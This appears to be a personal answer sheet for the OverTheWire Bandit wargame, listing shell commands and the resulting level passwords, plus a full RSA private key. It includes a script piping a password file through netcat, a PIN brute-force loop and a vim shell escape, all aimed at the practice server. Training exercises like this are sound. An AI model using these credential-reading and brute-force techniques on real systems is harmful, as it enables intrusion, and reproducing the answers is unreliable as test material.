ssh bandit0@bandit.labs.overthewire.org -p 2220
: bandit0

1)
- cat readme
: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If

2)
- cat ./-
: 263JGJPfgU6LtdEvgfWU1XP5yac29mFx

3)
- cat spaces\ in\ this\ filename
: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx

4)
- cat inhere/...Hiding-From-You
: 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ

5)
- file inhere/* | grep ASCII
- cat inhere/-file07
: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw

6)
- for f in $(find inhere/ -name .file2); do ls -la $f; done | grep 1033
- cat inhere/maybehere07/.file2
: HWasnPhtq9AVKe0dmk45nxy20cvUa6EG

7)
- ls -la -R / 2> /dev/null | grep 'bandit7 bandit6'
- find / -name bandit7.password 2> /dev/null
- cat /var/lib/dpkg/info/bandit7.password
: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj

8) 
- cat data.txt | grep millionth
: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc

9)
- cat data.txt | sort | uniq -c | grep '1 '
: 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM

10)
- strings data.txt | grep ==
: FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey

11)
- base64 -d data.txt
: dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr

12)
- cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
: 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4

13)
- mktemp -d
- xxd -r data.txt > file.gz
: FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn

14)
- ssh bandit14@localhost -i ./sshkey.private -p 2220
: MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS

15)
- telnet localhost 30000
- MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
: 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo 

16) 
- openssl s_client -connect localhost:30001
- 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
: kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx

17) 
- for i in {1000..2000}; do nmap -p 3$i localhost | grep open ; done
        31046/tcp open  unknown
        31518/tcp open  unknown
        31691/tcp open  unknown
        31790/tcp open  unknown
        31960/tcp open  unknown
- openssl s_client -connect localhost:31790 -ign_eof
: -----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

18)
- diff passwords.new passwords.old
: x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO

19)
- ssh bandit18@bandit.labs.overthewire.org -p 2220 -t "cat readme"
: cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8

20)
- ./bandit20-do cat /etc/bandit_pass/bandit20
: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO

21)
- tmux
- 1st: nc -l localhost 50000
- 2nd: ./suconnect 50000
- 1st: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
: EeoULMCra2q0dSkYj561DX7s1CpBuOBt

22)
- cat /etc/cron.d/cronjob_bandit22
- cat /usr/bin/cronjob/cronjob_bandit22.sh
- cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
: tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q

23)
- cat /etc/cron.d/cronjob_bandit23
- cat /usr/bin/cronjob/cronjob_bandit23.sh
- echo I am user bandit23 | md5sum | cut -d ' ' -f 1
- cat /tmp/8ca319486bfbbc3663ea0fbe81326349
: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

24)
- cat mostra_senha.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 | nc localhost 60000 
- nc -l 600000
: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

25)
- for i in {0000..9999} ; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" ; done | nc localhost 30002
: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

26)
- Putaria com more
- inside vim: set shell=/bin/bash
- inside vim: term
: s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ

27)
- ./bandit27-do cat /etc/bandit_pass/bandit27
: upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB

28) 
- git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN

29) 
- git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
- git show
: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7

30)
- git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
- git checkout dev
: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL

31)
- git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo
- git show secret
: fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy

32)
- git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
- echo "May I come in?" > key.txt
- git push
: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K

33)
- $0
- cat /etc/bandit_pass/bandit33
: tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0

34) 
- 
